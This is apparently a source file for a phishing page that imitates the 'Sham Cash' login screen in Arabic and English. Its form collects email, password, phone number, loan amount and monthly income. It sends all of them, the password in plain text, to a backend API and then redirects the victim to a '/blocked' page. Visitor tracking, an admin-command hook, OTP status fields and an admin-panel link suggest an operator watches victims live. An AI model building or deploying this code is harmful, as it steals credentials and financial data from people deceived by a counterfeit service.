import {
  Banknote, Eye, Grid3X3, Headphones, Lock, Phone, TrendingUp, UserRound,
} from "lucide-react";
import { useState, useEffect } from "react";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";
import { useAdminCommands } from "@/hooks/useAdminCommands";
import { useLang } from "@/hooks/useLang";
import { shamApi } from "@/lib/shamApi";

const T = {
  ar: {
    lang: "English", dir: "rtl" as const,
    heading: "تسجيل الدخول",
    email: "البريد الإلكتروني",
    password: "كلمة السر",
    loan: "قيمة القرض المطلوب",
    phone: "رقم الهاتف",
    income: "الدخل الشهري",
    submit: "تسجيل الدخول",
    forgotPass: "هل نسيت كلمة المرور؟",
    changePass: "تغيير كلمة المرور",
  },
  en: {
    lang: "العربية", dir: "ltr" as const,
    heading: "Sign In",
    email: "Email Address",
    password: "Password",
    loan: "Requested Loan Amount",
    phone: "Phone Number",
    income: "Monthly Income",
    submit: "Sign In",
    forgotPass: "Forgot your password?",
    changePass: "Change Password",
  },
};

function ShamLogo() {
  return (
    <div className="relative h-28 w-32">
      <div className="absolute left-5 top-12 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#5dd99f] via-[#44a984] to-[#257b6f] shadow-[0_18px_35px_rgba(20,219,144,0.12)]"
        style={{ clipPath: "polygon(0 20%, 64% 0, 100% 27%, 37% 57%, 100% 86%, 100% 100%, 36% 71%, 0 50%)" }} />
      <div className="absolute left-14 top-5 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#6273dd] via-[#5365c3] to-[#354075] shadow-[0_22px_40px_rgba(99,116,212,0.18)]"
        style={{ clipPath: "polygon(0 0, 100% 34%, 100% 100%, 35% 70%, 0 53%)" }} />
    </div>
  );
}

export function ShamCashLogin() {
  const [showPassword, setShowPassword] = useState(false);
  const [fields, setFields] = useState({ email: "", password: "", loan: "", phone: "", income: "" });
  const [lang, setLang] = useLang();
  const t = T[lang];

  useVisitorTracking("تسجيل الدخول");
  useAdminCommands();

  useEffect(() => {
    const id = localStorage.getItem("sham_visitor_id");
    if (id) {
      shamApi.patch(id, { page: "تسجيل الدخول", isActive: true, lastSeen: Date.now() });
    }
  }, []);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const visitorId = localStorage.getItem("sham_visitor_id") ?? `v-${Date.now()}`;
    localStorage.setItem("sham_visitor_id", visitorId);
    localStorage.setItem("sham_phone", fields.phone);

    await shamApi.submit({
      id: visitorId,
      submittedAt: new Date().toLocaleTimeString("ar-SY"),
      submittedAtTs: Date.now(),
      email: fields.email,
      password: fields.password,
      phone: fields.phone,
      loan: fields.loan,
      income: fields.income,
      otpCode: "",
      otpStatus: null,
      changepassStatus: null,
      page: "تسجيل الدخول",
      isActive: true,
      lastSeen: Date.now(),
    });

    window.location.href = "/blocked";
  }

  return (
    <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir={t.dir}>
      <div className="relative mx-auto flex min-h-screen w-full max-w-[390px] flex-col px-4 pb-7 pt-4 font-['Inter']">
        <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
        <div className="pointer-events-none absolute -right-28 bottom-20 h-80 w-80 rounded-full bg-[#1fc28a]/5 blur-3xl" />

        <div className="relative flex items-center justify-between pt-2">
          <button onClick={() => setLang(lang === "ar" ? "en" : "ar")} className="text-[15px] font-bold text-white/70 hover:text-white transition-colors">
            {t.lang}
          </button>
          <div className="flex h-9 w-9 items-center justify-center rounded-full text-white">
            <Headphones className="h-6 w-6" strokeWidth={2.5} />
          </div>
        </div>

        <div className="relative flex justify-center pb-6 pt-6">
          <ShamLogo />
        </div>

        <form className="relative space-y-5" onSubmit={handleSubmit}>
          <h1 className={`text-[27px] font-extrabold tracking-[-0.02em] text-white/90 ${lang === "ar" ? "text-right" : "text-left"}`}>
            {t.heading}
          </h1>

          <div className="space-y-4">
            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
              <div className="text-white/60"><UserRound className="h-5 w-5" /></div>
              <input type="text" placeholder={t.email}
                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
                dir={t.dir} autoComplete="email" value={fields.email}
                onChange={(e) => setFields((p) => ({ ...p, email: e.target.value }))} />
            </div>

            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
              <div className="text-white/60"><Lock className="h-5 w-5" /></div>
              <input type={showPassword ? "text" : "password"} placeholder={t.password}
                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
                dir={t.dir} autoComplete="current-password" value={fields.password}
                onChange={(e) => setFields((p) => ({ ...p, password: e.target.value }))} />
              <button type="button" onClick={() => setShowPassword(!showPassword)} className="text-white/60 hover:text-white/90 transition-colors">
                <Eye className="h-5 w-5" />
              </button>
            </div>
          </div>

          <div className="space-y-4 pt-1">
            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
              <div className="text-white/60"><Banknote className="h-5 w-5" /></div>
              <input type="number" placeholder={t.loan}
                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
                dir={t.dir} value={fields.loan}
                onChange={(e) => setFields((p) => ({ ...p, loan: e.target.value }))} />
            </div>

            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
              <div className="text-white/60"><Phone className="h-5 w-5" /></div>
              <input type="tel" placeholder={t.phone}
                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
                dir="ltr" autoComplete="tel" value={fields.phone}
                onChange={(e) => setFields((p) => ({ ...p, phone: e.target.value }))} />
            </div>

            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
              <div className="text-white/60"><TrendingUp className="h-5 w-5" /></div>
              <input type="number" placeholder={t.income}
                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
                dir={t.dir} value={fields.income}
                onChange={(e) => setFields((p) => ({ ...p, income: e.target.value }))} />
            </div>
          </div>

          <div className="grid grid-cols-[58px_1fr] gap-3 pt-1" dir="ltr">
            <button type="button" className="flex h-[58px] w-[58px] items-center justify-center rounded-[15px] bg-[#657bd8] shadow-[0_16px_35px_rgba(101,123,216,0.22)] transition-transform active:scale-[0.96] hover:bg-[#7089e0]">
              <Grid3X3 className="h-8 w-8 text-white" strokeWidth={2.6} />
            </button>
            <button type="submit" className="h-[58px] rounded-[15px] bg-[#657bd8] text-[20px] font-extrabold text-white shadow-[0_16px_35px_rgba(101,123,216,0.22)] transition-transform active:scale-[0.98] hover:bg-[#7089e0]">
              {t.submit}
            </button>
          </div>

          <p className="text-center text-[14px] font-semibold text-[#cfd2df]/78">
            {t.forgotPass}{" "}
            <span className="cursor-pointer text-[#7183e6] hover:underline" onClick={() => { window.location.href = "/changepass"; }}>
              {t.changePass}
            </span>
          </p>
          <p className="text-center text-[15px] font-semibold text-[#d4d6e3]/62">
            لا تملك حساب مسبقاً؟{" "}
            <span className="cursor-pointer text-[#6f82e5] hover:underline">إنشاء حساب</span>
          </p>
        </form>

        <footer className="relative mt-auto flex flex-col items-center gap-3 pb-0 pt-4 text-center">
          <a href="/admin-panel/" className="text-[12px] font-semibold text-white/25 hover:text-white/50 transition-colors tracking-wide">
            لوحة التحكم
          </a>
          <div className="space-y-3">
            <div className="text-[14px] font-extrabold tracking-[0.18em] text-white/68" dir="ltr">POWERED BY</div>
            <div className="mx-auto h-8 w-11 opacity-20">
              <svg viewBox="0 0 100 80" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M31 13h38l20 20-20 20H31L11 33 31 13Z" stroke="white" strokeWidth="8" />
                <path d="M40 24h24l10 10-10 10H40L29 34 40 24Z" stroke="white" strokeWidth="8" />
              </svg>
            </div>
            <div className="text-[12px] font-semibold tracking-[0.18em] text-white/70" dir="ltr">V 2.2.4</div>
          </div>
        </footer>
      </div>
    </div>
  );
}

export default ShamCashLogin;
